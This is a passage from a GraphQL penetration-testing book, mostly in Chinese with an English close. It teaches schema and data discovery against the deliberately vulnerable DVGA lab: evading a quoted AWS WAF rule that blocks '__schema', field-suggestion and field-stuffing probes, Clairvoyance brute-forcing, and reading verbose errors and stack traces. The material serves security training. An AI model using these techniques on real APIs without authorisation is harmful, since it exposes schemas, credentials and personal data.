  \n> NOTE 非生产 GraphQL 应用程序也可能在其环境中部署了 GraphiQL Explorer 或 GraphQL Playground。记住使用\
  \ EyeWitness 扫描图形 GraphQL 客户端，如第 4 章所述。\n\n## 利用 __type 元字段\n\n当 GraphQL 实现想要阻止内省查询执行时，它们通常会过滤掉包含关键字\
  \ __schema 的任何请求。然而，虽然大多数内省查询利用 __schema 元字段，但客户端也可以使用其他几个内省元字段。\n\n例如，__type 代表系统中的所有类型，可用于从\
  \ GraphQL 模式中提取类型详细信息。\n\n在 2022 年 5 月，我们在 AppSync 中发现了一个漏洞，AppSync 是亚马逊网络服务 AWS\
  \ 提供的一种为开发者提供 GraphQL 接口的服务。为了保护 AppSync 免受恶意客户端的侵害，AWS 在内部使用 WAF。我们发现了一种绕过 WAF\
  \ 并执行内省查询的方法。WAF 包含针对 GraphQL 应用程序量身定制的规则，其中一条阻止通过 __schema 元字段探测 GraphQL API 的尝试，但没有考虑其他内省元字段。\n\
  \n该规则本身以 JSON 的形式定义如下：\n\n```\n{\n  \"Name\": \"BodyRule\",\n  \"Priority\": 5,\n\
  \  \"Action\": {\n    \"Block\": {}\n  },\n  \"VisibilityConfig\" {\n    \"SampledRequestsEnabled\"\
  : true,\n    \"CloudWatchMetricsEnabled\": true,\n    \"MetricName\": \"BodyRule\"\
  \n  },\n  \"Statement\": {\n    \"ByteMatchStatement\": {\n      \"FieldToMatch\"\
  : {\n        \"Body\": {}\n      },\n      \"PositionalConstraint\": \"CONTAINS\"\
  ,\n```\n\n```\n\"SearchString\": \"__schema\",\n\"TextTransformation\": [\n    {\n\
  \        \"Type\": \"NONE\",\n        \"Priority\": 0\n    }\n]\n}\n```\n\n使用字符串搜索（SearchString），WAF\
  \ 规则会在任何传入 HTTP 请求中查找 __schema 关键字并阻止其进入应用程序。因为规则使用 CONTAINS 作为位置约束（PositionalConstraint）并匹配\
  \ HTTP Body 字段（FieldToMatch），因此在正文负载中提及 __schema 的任何内容都会导致拒绝操作。\n\n> NOTE\n> 当我们向亚马逊安全团队披露安全问题时，他们迅速响应，通过更新\
  \ AWS AppSync 文档来解决该问题。\n\n这个例子说明，如果 __schema 内省金丝雀查询被拒绝，我们可以使用另一个金丝雀查询来评估内省是否真正被禁用。Listing\
  \ 6-2 中的 __type 内省金丝雀查询如果内省未被正确禁用，将返回预定的响应。此查询请求模式中根查询操作的 name 字段。尝试将其发送到你的本地 DVGA\
  \ 实例。\n\n```\n{\n  __type(name:\"Query\") {\n    name\n  }\n}\n```\n\nListing 6-2:\
  \ 一个 __type 内省金丝雀查询\n\n因为我们知道查询操作的名字始终为 Query，响应应与 Listing 6-3 所示完全相同。\n\n```\n\
  {\n  \"data\": {\n    \"__type\": {\n      \"name\": \"Query\"\n    }\n  }\n}\n\
  ```\n\nListing 6-3: __type 内省金丝雀查询的预定响应\n\n作为黑客，如果我们注意到内省未被正确禁用，我们可以扩展 __type 内省金丝雀查询，填充一系列潜在的自定义对象类型名称并提取有价值的模式信息。\n\
  \n我们将在第 150 页的“在 __type 元字段中进行类型填充”中讨论这种填充技术。\n\n## 使用字段建议\n\n许多 GraphQL 实现采用的流行功能是字段建议，当客户端发送包含拼写错误的请求时激活。与大多数返回\
  \ 400 Bad Request 状态代码的 REST API 不同，如果 HTTP 查询格式错误，GraphQL 会以更友好的方式响应，通过建议可能的更正。此功能不是\
  \ GraphQL 规范的一部分，但在今天可用的大多数 GraphQL 服务器实现中都很常见。\n\n根据我们的经验，实现通常返回三到五个建议。然而，并非 GraphQL\
  \ 请求的每个部分都会返回字段建议。例如，如果你在根查询操作中拼写错误，GraphQL 实现不会尝试自动纠正它。\n\n让我们看看字段建议响应是什么样的。假设我们向\
  \ DVGA 发送一个查询，尝试请求 pastes 字段的 title 但拼写为 titlr。在错误消息中，GraphQL 会让客户端知道该字段无法查询，并建议模式中存在的字段：\n\
  \n```\n{\n  \"errors\": [\n    {\n      \"message\": \"Cannot query field \\\"titlr\\\
  \" on type \\\"PasteObject\\\". Did you mean \\\"title\\\"?\",\n      \"locations\"\
  : [\n        {\n          \"line\": 15,\n          \"column\": 5\n        }\n  \
  \    ]\n    }\n  ]\n}\n```\n\n错误消息 Cannot query field . . . Did you mean . . . ?\
  \ 很常见。如果 GraphQL 服务器实现支持字段建议，你应该会看到类似的消息。\n\n虽然字段建议在大多数流行的 GraphQL 实现中都可用，但并非所有实现都提供禁用此功能的选项。以下是如何在\
  \ Graphene 中禁用字段建议的示例，Graphene 是 DVGA 基于的 Python GraphQL 实现：\n\n```\ngraphql.pyutils.did_you_mean.MAX_LENGTH\
  \ = 0\n```\n\n在此示例中，MAX_LENGTH 是在查询中出现拼写错误时返回给客户端的建议数量。将 MAX_LENGTH 设置为 0 意味着不会返回任何建议，从而完全禁用该功能。\n\
  \n\n\n\n\n# 理解编辑距离算法\n\n为了确定拼写错误是否与模式中的有效对象、字段或参数相似，GraphQL 实现依赖于简单的编辑距离算法。理解编辑距离可以帮助我们优化用于从字段建议中发现名称的暴力破解脚本。\n\
  \n该匹配算法比较任意两个字符串，并根据使它们匹配所需的字符操作数量返回它们的相似度。从一个字符串中添加、替换或删除一个字符都算作一次操作。例如，要将错误的字段名\
  \ titlr 与正确的名称 title 匹配，我们需要将字符 r 替换为 e，由此得到的编辑距离为 1。表 6-1 显示了额外的字符串比较及其对应的编辑距离。\n\
  \n## 表 6-1：两个字符串之间的编辑距离\n\n| String | Typo | Operations | Edit distance |\n|---|---|---|---|\n\
  | title | titl | Add e | 1 |\n| content | rntent | Replace r with c, add o | 2 |\n\
  \nGraphQL 实现使用可变的编辑距离阈值，根据清单 6-4 中所示的公式计算，以决定是否显示字段建议。此示例直接取自 GraphQL 参考实现 GraphQL.js\
  \ 的源代码。\n\n```\nconst threshold = Math.floor(input.length * 0.4) + 1;\n```\n\n清单\
  \ 6-4：来自 GraphQL.js 的编辑距离阈值代码片段\n\n此代码取字符串的长度，将其乘以 0.4，使用 Math.floor 函数向下取整，然后加\
  \ 1。例如，像 content 这样七个字符的字符串必须具有 3 或更小的编辑距离阈值才能触发相关的字段建议。\n\n## 优化字段建议使用\n\n你会发现很有用的是，单个拼写错误可以返回多个字段名称。GraphQL\
  \ 将返回所有可能与提供的拼写错误匹配的字段。例如，以下查询请求了来自 pastes 顶级字段的拼写错误的 owne 字段（owner）：\n\n```\nquery\
  \ {\n  pastes {\n    owne\n  }\n}\n```\n\n这个单个 owne 拼写错误在 owner 和 ownerId 字段的编辑距离阈值范围内。当这种情况发生时，GraphQL\
  \ 实现不知道客户端想要请求哪个字段，因此它返回两者：\n\n```\n{\n  \"errors\": [\n    {\n      \"message\"\
  : \"Cannot query field \\\"owne\\\" on type \\\"PasteObject\\\". Did you mean \\\
  \"owner\\\" or \\\"ownerId\\\"?\",\n      \"locations\": [\n        {\n        \
  \  \"line\": 24,\n          \"column\": 3\n        }\n      ]\n    }\n  ]\n}\n```\n\
  \n另一个有用的事实是，客户端在单个请求中发送的拼写错误数量没有限制。对于每个拼写错误，GraphQL 服务器都会尝试建议自动更正。例如，在以下请求中，我们发送了一个包含多个字段的查询，所有字段都有拼写错误：\n\
  \n```\nquery {\n  pastes {\n    tte\n    tent\n    bli\n    urn\n  }\n}\n```\n\n\
  GraphQL 服务器分析每个拼写错误并返回编辑距离阈值内的所有可能的字段建议列表。这种 GraphQL 响应行为允许批量信息收集：\n\n```\n{\n \
  \ \"errors\": [\n    {\n      \"message\": \"Cannot query field \\\"tte\\\" on type\
  \ \\\"PasteObject\\\". Did you mean \\\"title\\\"?\",\n      --snip--\n    },\n\
  \    {\n      \"message\": \"Cannot query field \\\"tent\\\" on type \\\"PasteObject\\\
  \". Did you mean \\\"content\\\"?\",\n      \"locations\": [\n      --snip--\n \
  \     ]\n    },\n    {\n      \"message\": \"Cannot query field \\\"bli\\\" on type\
  \ \\\"PasteObject\\\". Did you mean \\\"public\\\"?\",\n      --snip--\n    ]\n\
  \  ]\n}\n```\n\n```\n},\n{\n  \"message\": \"Cannot query field \\\"urn\\\" on type\
  \ \\\"PasteObject\\\".\\n    Did you mean \\\"burn\\\"?\",\n--snip--\n  ]\n}\n```\n\
  \n第 5 章讨论的查询批处理可以让你通过在单个 HTTP 请求中批处理许多请求来进一步优化此类攻击。\n\n## 考虑安全发展\n\n截至本文撰写时，正在进行的安全发展可能会影响未来字段建议的使用。2019\
  \ 年 11 月 5 日，针对 GraphQL 参考实现 GraphQL.js 中字段建议的使用提出了一个 GitHub 问题。\n\n该问题指出，攻击者可以通过发送无效的\
  \ GraphQL 文档来探测服务器的模式详细信息。它引用了一个文件 didYouMean.ts，该文件被多个验证规则使用。此文件可以在开发 API 时为开发人员提供有用的建议，但也可以用于泄露信息。\n\
  \n作为回应，GraphQL 联合创始人 Lee Byron 评论如下：\n\n> I would expect that a schema with introspection\
  \ disabled would also disable didYouMean. I can’t think of a reason why you would\
  \ want to disable introspection but enable didYouMean or vice versa.\n\n在支持 Byron\
  \ 对此事看法的评论线程之后，于 2022 年 1 月 28 日提出了一个拉取请求，以在禁用内省时禁用字段建议。如果合并，此拉取请求将使在禁用内省时滥用字段建议变得困难。\n\
  \n虽然这一变化是 GraphQL 安全性的积极发展，但我们黑客应该考虑几个要点。首先，在问题首次提出后，社区花了两年多时间才开发出潜在的解决方案。在像 GraphQL\
  \ 这样以开源和社区驱动的技术中，重大安全问题不一定会迅速得到修补。\n\n其次，虽然在 GraphQL 参考实现中得到解决，但此补丁在所有服务器实现和 GraphQL\
  \ 使用的生产部署中获得广泛采用可能需要时间。\n\n现在，如果同时禁用内省和字段建议，我们该如何继续探索目标的模式？在下一节中，我们将深入研究另一种技术，我们可以用它来潜在地发现看似无害的\
  \ GraphQL 查询背后的敏感信息。\n\n## 使用字段填充\n\n字段填充是一种 GraphQL 信息泄露技术，其中字段列表被插入到 GraphQL 查询中。我们可以使用字段填充来潜在地发现诸如密码、密钥和\
  \ PII 等敏感信息，通过猜测并将这些潜在的字段名称传递到我们知道有效的查询请求中。\n\n例如，假设我们通过使用 Burp Suite 在观察目标上正常用户操作如何工作时拦截流量，从而捕获了以下查询。这是查找信息泄露漏洞的良好初始步骤。（第\
  \ 2 章解释了如何使用 Burp Suite 拦截流量。）\n\n```\nquery {\n  user {\n    name\n  }\n}\n```\n\
  \n像这样的查询可能返回一些无害的内容，比如当前登录用户帐户的名称。而且由于内省被禁用，我们不能确定在这个 user 对象中还有哪些诱人的字段可供我们使用。\n\
  \n字段填充可能允许我们绕过这一点。从本质上讲，此技术利用了 GraphQL 模式中对象的字段可能与数据库列密切映射的可能性。表 6-2 显示了一个示例 MySQL\
  \ 数据库模式，可能代表我们的用户表。\n\n## 表 6-2：示例用户表 MySQL 数据库模式\n\n| MySQL schema | GraphQL type\
  \ and field |\n|---|---|\n| id BIGINT(20) | User.id (Int) |\n| name VARCHAR(50)\
  \ | User.name (String) |\n| mobile VARCHAR(50) | User.mobile (String) |\n| email\
  \ VARCHAR(50) | User.email (String) |\n| password_hash VARCHAR(32) | User.password_hash\
  \ (String) |\n| registered_at DATETIME | User.registered_at (custom DATETIME scalar\
  \ type or String) |\n| last_login DATETIME | User.last_login (custom DATETIME scalar\
  \ type or String) |\n| intro TEXT | User.intro (String) |\n| profile TEXT | User.profile\
  \ (String) |\n| api_key VARCHAR(50) | User.api_key (String) |\n\n为了表示整数和字符串，MySQL\
  \ 使用 BIGINT 和 VARCHAR 等类型，而 GraphQL 使用 Int 和 String 等标量类型。MySQL 还有用于日期和时间等事物的内置类型，使用\
  \ DATETIME 数据类型。在 GraphQL 中，我们可能需要使用自定义标量类型，例如 DATETIME，或 String 标量类型。序列化为实际日期时间表示将由应用程序的逻辑完成。\n\
  \n作为攻击者，我们显然事先不知道数据库模式是什么，但我们可以对这些额外的数据库列可能是什么做出有根据的猜测，并开始将它们的可能字段名称填充到查询中。以下是添加到我们用户查询中的潜在字段名称列表：\n\
  \n```\nquery {\n  user {\n    name\n    username\n    address\n    birthday\n  \
  \  age\n    password\n    sin\n    ssn\n    apiKey\n    token\n    emailAddress\n\
  \    status\n  }\n}\n```\n\n请注意你尝试的字段名称的格式。SDL 文件中的字段和参数通常以 snake_case 样式设置，在这种样式中，每个空格被下划线\
  \ (_) 符号替换，并且每个单词的首字母为小写。例如，API 密钥字段很可能定义为 api_key。然而，当作为客户端查询 GraphQL API 时，这些字段和参数可能以\
  \ camelCase 显示，在这种样式中，由多个单词组成的名字连接成一个没有标点符号的单词，并且该单词的首字母为小写（也称为 lowerCamelCase）。这是因为某些\
  \ GraphQL 实现会自动转换字段和参数的样式。然而，命名约定可以更改，因为它们完全取决于应用程序维护者。有关命名约定的更多信息可以在 https://graphql-rules.com/rules/naming\
  \ 上找到。\n\n将数百个潜在字段名称填充到单个查询中，就像蒙着眼睛玩飞镖游戏并希望击中靶心一样。如果我们幸运的话，我们的一个或多个查询字段将解析并返回数据（或可能甚至建议一些在编辑距离阈值内的替代字段名称）。\n\
  \n## 类型填充在 __type 元字段中\n\n在本章前面，我们提到某些应用程序在尝试禁用内省时可能无法拒绝使用 __type 元字段的查询。如果是这样，我们可以使用与字段填充类似的技术来获得\n\
  \n\n\n深入了解应用程序的 schema：即把潜在的类型名称塞进 __type 字段的 name 参数中。\n\n让我们利用 DVGA 糟糕的禁用 introspection\
  \ 方法，通过发送以下针对 PasteObject 的 __type introspection 查询来获取其 schema 中的字段列表：\n\n```\n\
  {\n  __type(name:\"PasteObject\") {\n    name\n    fields {\n      name\n    }\n\
  \  }\n}\n```\n\n此查询的响应应为我们提供 PasteObject 类型中所有字段名称的列表：\n\n```\n{\n  \"data\": {\n\
  \    \"__type\": {\n      \"name\": \"PasteObject\",\n      \"fields\": [\n    \
  \    {\n          \"name\": \"id\"\n        },\n        {\n          \"name\": \"\
  title\"\n        },\n        {\n          \"name\": \"content\"\n        },\n  \
  \      {\n          \"name\": \"public\"\n        },\n        {\n          \"name\"\
  : \"userAgent\"\n        },\n        {\n          \"name\": \"ipAddr\"\n       \
  \ },\n        {\n          \"name\": \"ownerId\"\n        },\n        {\n      \
  \    \"name\": \"burn\"\n        },\n        {\n          \"name\": \"owner\"\n\
  \        }\n      ]\n    }\n  }\n}\n```\n\n正如我们之前使用字段 stuffing 来识别字段名称一样，我们可以尝试不同的类型名称，直到找到一个存在的名称为止。就命名约定而言，GraphQL\
  \ 中的类型名称通常以 UpperCamelCase 形式书写（例如，PrivatePasteProperties）。\n\n我们现在已经具备了手动测试和分析\
  \ GraphQL 应用程序是否存在若干信息泄露弱点的理论知识。接下来，我们将研究如何将我们对 GraphQL 的新理解应用于利用自动化工具，使我们的攻击更高效。\n\
  \n## 使用 Clairvoyance 自动化字段建议和 Stuffing\n\nClairvoyance 可以利用字段建议和 stuffing 功能，从目标中发现有效的字段信息。在本节中，我们将使用\
  \ Clairvoyance 执行暴力请求。我们的目标是拼接多个建议，并在不依赖 introspection 的情况下尽可能多地发现 schema 信息。\n\n\
  Clairvoyance 以 wordlist 作为输入，并将其内容塞入多个 GraphQL 查询中，以识别任何有效的操作、字段、参数、输入类型和其他关键 schema\
  \ 元素。在幕后，它使用正则表达式匹配错误消息中的有效字段，依赖于字段建议。一旦完成对整个 wordlist 的解析，它就会输出一个 schema。\n\n我们可以使用此输出\
  \ schema 来探测敏感信息泄露的机会。\n\n使用 Clairvoyance 等工具进行字段 stuffing 时，当使用的 wordlist 与我们针对的\
  \ GraphQL schema 的元素相匹配时效率最高。网上有许多 wordlist，但大多数是为猜测密码、目录或用户名而设计的。因为我们试图猜测字段、操作和参数的名称，所以我们可能使用通用英语词典单词列表会取得最大成功。\n\
  \n> NOTE\n> 如果你针对的 GraphQL 应用程序不是用英语编写的，最好使用应用程序客户端或用户原生使用的语言的 wordlist。\n\n一个合适的\
  \ wordlist 是 Derek Chuank 创建的高频词汇 wordlist。这个包含 30,000 个常见英语单词的列表是一个很好的起点。要获取此 wordlist，请运行以下命令：\n\
  \n```\n# cd ~\n# git clone https://github.com/nicholasaleks/high-frequency-vocabulary\n\
  ```\n\n现在我们有了可以使用的 wordlist，让我们将 Clairvoyance 投入行动并攻击 DVGA 实例。请记住，它应处于 Expert（加固）模式以禁用\
  \ introspection。\n\n进入你安装 Clairvoyance 的目录，然后使用 -w（words）参数用 wordlist 对其执行 DVGA。-o\
  \ 参数告诉 Clairvoyance 在运行时生成的 schema 应输出到何处：\n\n```\n# cd ~/clairvoyance\n# python3\
  \ -m clairvoyance http://localhost:5013/graphql -w ~/high-frequency-vocabulary/30k.txt\
  \ -o clairvoyance-dvga-schema.json\n```\n\n根据 wordlist 的大小，Clairvoyance 可能需要几分钟才能完成执行。完成后，你应该在\
  \ clairvoyance 目录中看到一个名为 clairvoyance-dvga-schema.json 的新文件。\n\n让我们通过将 Clairvoyance\
  \ 给我们的 schema 与从 introspection 查询生成的 schema 进行比较来测试我们 wordlist 的效率。为了最好地表示这些差异，我们可以利用位于\
  \ http://lab.blackhatgraphql.com:9000 或 https://ivangoncharov.github.io/graphql-voyager\
  \ 的 GraphQL Voyager，并上传两个 schema。图 6-1 显示了 DVGA 的 schema，图 6-2 显示了 Clairvoyance\
  \ 重建的 schema。\n\n正如你所见，Clairvoyance 能够恢复 DVGA schema 的几乎每个字段和操作！对于一个未启用 introspection\
  \ 的应用程序来说，这已经相当不错了。\n\n另一个不错的选择是生成我们自己的 wordlist。如前所述，像 Clairvoyance 这样的工具的强大程度仅取决于我们提供的\
  \ wordlist。我们可以通过做出有根据的猜测，或通过从信息收集阶段收集的 HTTP 流量、静态文件和其他资源中提取关键字来扩展我们的列表。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_178_0.png)\n\
  \n图 6-1：原始 DVGA schema\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_179_0.png)\n\n\
  图 6-2：由 Clairvoyance 重建的 DVGA schema\n\n像 Custom Word List Generator（CeWL）这样的工具，可以从应用程序的前端\
  \ HTML 中提取关键字，它已预装在 Kali 中。尝试使用以下一行命令来分析和提取 DVGA 界面的信息：\n\n```\n# cewl http://localhost:5013/\n\
  ```\n\n此命令将返回一个单词列表，你可以在手动字段 stuffing 攻击中使用它。或者，将其与你的 30,000 个单词列表合并并与 Clairvoyance\
  \ 一起使用。你可以通过简单的 Bash 命令合并两个文本文件：\n\n```\n# paste -d \"\\n\" wordlist1.txt wordlist2.txt\
  \ > merged_wordlist.txt\n```\n\n## 利用错误消息\n\n通过错误消息进行信息泄露是一种安全弱点，即应用程序或系统在错误消息中向最终用户泄露敏感信息。这些消息如果应用程序未正确处理，可能泄露诸如密钥、用户凭据、用户信息、数据库详细信息、应用程序环境变量以及文件或操作系统详细信息等数据。\n\
  \n正如我们通过对字段建议的探索所发现的，GraphQL 错误消息可能非常冗长。默认情况下，GraphQL 倾向于向客户端过度分享，以改善整体开发体验。通过了解\
  \ GraphQL 错误消息，我们可以利用它们所揭示的信息来开展攻击。\n\n我们已经提到，GraphQL 错误消息与使用标准 HTTP 状态码的 REST 错误消息不同。根据规范，GraphQL\
  \ 错误响应不需要 HTTP 状态码，通常只包含三个唯一字段：Message、Location 和 Path。要亲眼看到这一点，请尝试发送以下 mutation\
  \ 在 DVGA 中创建新 paste。此请求缺少必需的 title 参数：\n\n```\nmutation {\n  createPaste(content:\"\
  Hi\", public: false) {\n    paste {\n      id\n    }\n  }\n}\n```\n\n如果我们向 DVGA\
  \ 发送此不正确的 mutation 请求，它将返回一个标准的错误 JSON 对象供我们分析。此错误响应应包含查询中识别出的所有错误的数组：\n\n```\n\
  {\n  \"errors\": [\n    {\n      \"message\": \"mutate() missing 1 required positional\
  \ argument: 'title'\",\n      \"locations\": [\n        {\n          \"line\": 2,\n\
  \          \"column\": 3\n        }\n      ],\n      \"path\": [\n        \"createPaste\"\
  \n      ]\n    }\n  ],\n  \"data\": {\n    \"createPaste\": null\n  }\n}\n```\n\n\
  错误响应格式可能包含 message、location 和 path 等特殊键。这些键向客户端提供错误的描述，以及查询中错误发生的位置：\n\nmessage\
  \  message 字段是每个 GraphQL 错误中必需的，包含错误的 high-level 描述。在本例中，message 字段让我们知道我们的 mutation\
  \ 操作缺少一个必需的位置参数 title。大多数信息泄露弱点都发生在 message 字段中，因此请务必留意它。\n\nlocation  对于长而复杂的 GraphQL\
  \ 文档（例如大型 fuzzing 文档），返回的错误响应可能\n\n\n\n解析起来会很困难。这时 location 字段就派上用场了。如果一个错误可以与 GraphQL\
  \ 文档中的特定位置关联起来，该字段将包含该位置的行号和列号。在我们的示例中，错误位于第 2 行第 3 列，这指向了 createPaste  mutation。请注意，这些位置列中会计算缩进空格。\n\
  \npath path 字段引用特定字段，并用于确定 null 结果是故意为之还是由运行时错误引起。在此示例中，我们可以看到 path 错误发生的原因是我们无法在尝试创建新\
  \ paste 之后返回 id 响应。Path 错误也可能发生在字段以联合或接口返回值时，但该值无法解析为该联合或接口的成员时。然而，大多数实现，包括 DVGA，在验证错误引起的\
  \ path 错误时不会返回。\n\nextensions extensions 字段用于在多个 GraphQL 服务中扩展我们刚刚提到的 message、location\
  \ 和 path 字段。Extensions 保留给实现和插件使用，通常包含诸如错误代码、时间戳、堆栈跟踪和速率限制信息等信息。\n\n## 探索过度错误信息\n\
  \n现在你已经了解了 GraphQL 错误数组的一些标准元素，就可以开始探测它们以获取敏感信息了。以下错误是在 DVGA 中在客户端尝试发送 createUser\
  \ mutation 请求且用户名已存在于数据库时引发的：\n\n```\n{\n  \"errors\": [\n    {\n      \"message\"\
  : \"(sqlite3.IntegrityError) UNIQUE constraint failed: users.username\\n[SQL: INSERT\
  \ INTO users (username, password) VALUES (?, ?)]\\n[parameters: ('tom', 'secret')]\\\
  n(Background on this error at: http://sqlalche.me/e/13/gkpj)\",\n      \"locations\"\
  : [\n        {\n          \"line\": 2,\n          \"column\": 3\n        }\n   \
  \   ],\n      \"path\": [\n        \"createUser\"\n      ]\n    }\n  ],\n  \"data\"\
  : {\n    \"createUser\": null\n  }\n}\n```\n\n正如你所见，响应错误明显过度共享信息。message 字段直接来自\
  \ SQLite3 数据库，并向我们提供了用于将新用户记录插入 users 表的整个 SQL 语句。我们还看到了唯一的用户名数据库列和一个密码列，显然在插入时并未加密。\n\
  \n这条单一的错误信息可能使恶意行为者能够指纹识别 SQL 数据库，并可能枚举其中存储的所有有效用户账户。它还使应用程序暴露于 SQL 注入攻击，因为它向攻击者提供了有关\
  \ SQL 查询如何构建的洞察。\n\n在通过错误消息测试信息泄露问题时，你可能希望以不同方式模糊测试 API，直到一系列操作或格式错误的输入使服务器抛出意外的错误。并非所有\
  \ GraphQL 服务器都相同，尝试各种测试用例直到有所收获是很重要的。\n\n例如，如果你发送格式错误的查询，在查询中不应该存在的地方指定特殊字符，甚至通过\
  \ GraphQL 不常用的 HTTP 方法（如 PUT）发送查询，都可能导致意外的服务器处理错误。当这种情况发生时，你需要留意 errors 或 extensions\
  \ GraphQL 响应 JSON 键中的任何非标准输出，以识别服务器可能在响应中包含的额外细节。\n\n## 启用调试\n\n开发人员在排查 GraphQL\
  \ 应用程序问题时会使用调试信息。当启用调试模式时，GraphQL 服务器会以详细的消息响应客户端请求，这些消息与后端服务器错误相关，而在正常情况下不会显示。例如，客户端可能收到的不是标准错误，而是包含详细错误消息的堆栈跟踪。这些调试消息可能包含我们在后续攻击目标时可以利用的有价值信息。\n\
  \nNOTE 并非所有 GraphQL 实现都支持调试模式。GraphQL Threat Matrix（https://github.com/nicholasaleks/graphql-threat-matrix）指出了哪些实现支持它。\n\
  \n大多数支持调试的 GraphQL 实现可以通过使用环境变量来启用调试模式。许多实现还支持 tracing，这是一种有用的工具，可跟踪 GraphQL 完成查询所需的时间，并将该数据连同有关请求的其它元数据一起添加到响应中的\
  \ extensions 键中。\n\n一些实现默认启用调试模式，甚至可能允许客户端通过 cookie 和 URL 参数启用它。例如，根据 Magento 的\
  \ GraphQL 实现文档，客户端可以通过在端点 URL 中添加 ?XDEBUG_SESSION_START=PHPSTORM 参数来开始调试。另一个常用的启用调试模式的参数是\
  \ debug 查询参数，其值为 1（表示 true），例如：\n\n```\nhttp://example.com/graphql?debug=1\n```\n\
  \n开发人员最有可能在他们的 staging 或开发环境中使用调试模式。你可以使用非生产 GraphQL URL 列表（https://github.com/dolevjf/Black-Hat-GraphQL/blob/master/resources/non-production-graphql-urls.txt）来测试多个\
  \ GraphQL 子域和端点上的详细调试错误消息。\n\n许多开发人员还可能通过在 JavaScript 中使用 console.log 函数将调试消息写入浏览器的控制台。在浏览器的开发者工具中，使用\
  \ Console 选项卡检查控制台消息，以查找可能归因于 GraphQL 功能的调试日志。\n\n## 从堆栈跟踪推断信息\n\n堆栈跟踪（也称为堆栈回溯和堆栈跟踪回溯）是应用程序在发生异常错误时执行的函数调用。这条面包屑轨迹对于开发人员尝试识别其源代码中的故障条件非常有用。但如果这些堆栈跟踪被暴露给黑客，我们就可以利用有关系统和源代码的敏感信息来提取数据并定制未来的攻击。\n\
  \n如前所述，同一服务器上的各种 GraphQL 端点可能具有不同的配置设置。例如，DVGA 的 /graphql 端点不会向引发错误的客户端请求抛出堆栈跟踪。然而，/graphiql\
  \ 端点提供了图形查询工具的访问权限，其配置为在发生错误时返回堆栈跟踪。\n\n如果你想想，这对每个端点设置不同的设置是有意义的。假设是开发人员使用图形界面进行调试和测试，因此他们可能需要详细的错误消息来识别错误，而这在生产端点如\
  \ /graphql 中是不必要的。\n\n让我们练习利用此配置。使用浏览器，导航到 DVGA http://localhost:5013 并通过立方体菜单图标切换到\
  \ Beginner 模式。接下来，为了作为客户端访问 DVGA 的 /graphiql 端点，我们需要使用浏览器的开发者工具将 env cookie 从其默认值\
  \ graphiql:disable 修改为 graphiql:enable。你可以通过按 CTRL-SHIFT-I 或在浏览器窗口中的任何位置右键单击并选择\
  \ Inspect 来访问这些工具。图 6-3 显示了 Firefox 中的 Inspect 窗口。\n\n你可以直接从浏览器修改 env cookie，方法是单击\
  \ Storage 选项卡，然后单击 Cookies，并从下拉菜单中选择 http://localhost:5013。你需要双击值字段。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_184_0.png)\n\
  \n图 6-3：显示 DVGA cookie 的 Firefox Inspect 窗口\n\n修改 env cookie 后，你应该能够从 GraphiQL Explorer\
  \ 面板发送包含拼写错误的查询。例如，尝试请求不存在的 pastes 字段 titled，如下所示：\n\n```\nquery {\n  pastes {\n\
  \    titled\n  }\n}\n```\n\n响应应包含堆栈跟踪：\n\n```\n{\n  \"errors\": [\n    {\n     \
  \ \"message\": \"Cannot query field \\\"titled\\\" on type \\\"PasteObject\\\".\\\
  nDid you mean \\\"title\\\"?\",\n      \"extensions\": {\n        \"exception\"\
  : {\n          \"stack\": [\n            \" File \\\"/Users/dvga-user/Desktop/Damn-Vulnerable-GraphQL-Application/venv/lib/python3.x/site-packages/gevent/baseserver.py\\\
  \", line 34,\\n in _handle_and_close_when_done\\n  return handle(*args_tuple)\\\
  n\",\n            --snip--\n            \" File \\\"/Users/dvga-user/Desktop/Damn-Vulnerable-GraphQL-Application/venv/lib/python3.x/site-packages/flask/app.py\\\
  \", line 2464,\\n in __call__\\n  return self.wsgi_app(environ, start_response)\\\
  n\",\n            --snip--\n          ],\n          \"debug\": \"Traceback (most\
  \ recent call last):\\n File \\\"/Users/dvga-user/Desktop/Damn-Vulnerable-GraphQL-Application/venv/lib/python3.x/site-packages/flask_sockets.py\\\
  \", line 40, in __call__\\n ...\",\n          \"path\": \"\\\\/Users/dvga-user/Desktop/Damn-Vulnerable-GraphQL-Application/core/view_override.py\"\
  \n        }\n      }\n    }\n  ]\n}\n```\n\n\n\n\n\nThe stack trace returns a wealth\
  \ of information that we can use to uncover vulnerabilities, such as dependencies,\
  \ software versions, software frameworks, and source code snippets. This stack trace\
  \ also provides us with information such as user account, filesystem, and operating\
  \ system details.\n\nIn DVGA, stack tracing is enabled only on the /graphql endpoint\
  \ that GraphiQL Explorer uses to send queries to. This is to show you that GraphQL\
  \ endpoints could have different configurations, so you want to test both if there\
  \ is more than one.\n\n## Leaking Data by Using GET-Based Queries\n\nAs we mentioned\
  \ in Chapter 1, some GraphQL implementations allow clients to execute queries using\
  \ the GET method, while others allow only POST requests. Mutation operations in\
  \ particular should be sent using only POST methods. However, some implementations,\
  \ like Scala-based Sangria, may allow GET requests for mutation operations as well.\n\
  \nBecause GET requests transmit data as query parameters in the URL, they risk exposing\
  \ sensitive information. For example, the following URL sends a GET request to DVGA.\
  \ We pass a phone number in the variables GET parameter:\n\n```\nhttp://localhost:5013/graphql?query=query($phone:\
  \ String)\n{ paste(title: $phone) { id title } }&variables={\"phone\":\"555-555-1337\"\
  }\n```\n\nThe same query can also be sent in the following manner, by omitting the\
  \ variables parameter and inserting the phone number directly into the query:\n\n\
  ```\nhttp://localhost:5013/graphql?query=query{ paste(title: \"555-555-1337\") {\
  \ id title } }\n```\n\nIn real applications, phone numbers are considered PII. These\
  \ URLs will show up in the web server access logs of GraphQL servers (such as Apache\
  \ or Nginx). Any sensitive information they contain may be logged in various locations,\
  \ such as in referrer headers and any forward or reverse proxies between the requesting\
  \ client and the server.\n\nWhile this condition doesn’t directly give us information\
  \ we don’t already have, it’s important to highlight such cases to clients in your\
  \ penetration tests as something to be wary of.\n\n## Summary\n\nIn this chapter,\
  \ we explored how to extract valuable information from our targets by using a variety\
  \ of tools and techniques. When introspection is enabled, you can use InQL to automatically\
  \ extract the schema from GraphQL targets. When introspection is disabled, you can\
  \ exploit a built-in\n\nGraphQL feature known as field suggestions and “stuff” fields\
  \ by using a tool called Clairvoyance.\n\nYou learned how to identify and bypass\
  \ poor attempts at disabling introspection by using unblocked introspection meta-field\
  \ queries. You also learned to uncover system details by using verbose GraphQL error\
